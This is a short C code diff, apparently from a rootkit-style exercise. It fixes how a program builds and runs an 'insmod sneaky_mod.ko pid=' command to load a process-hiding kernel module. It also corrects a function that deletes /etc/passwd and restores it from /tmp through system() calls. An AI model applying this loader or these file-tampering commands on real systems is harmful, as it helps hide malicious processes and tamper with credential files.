@@ -13,8 +13,11 @@ void copyAndStorePwd(){
 void loadSneakyMod(){
     char cmd[50];
     strcpy(cmd,"insmod sneaky_mod.ko pid=");
-    char pid[20] = getpid();
-    strcat(cmd,pid);
+    int pid = getpid();
+    const size_t pid_len = 5;
+    char * pid_str = malloc(pid_len+1);
+    sprintf(pid_str, "%d", pid);
+    strcat(cmd,pid_str);
     system(cmd);
 }
 
@@ -23,7 +26,7 @@ void unloadSneakyMod(){
 }
 
 void restorePwd(){
-    system("rm /etc/passwd")
+    system("rm /etc/passwd");
     system("cp /tmp/passwd /etc");
     system("rm /tmp/passwd");
 }
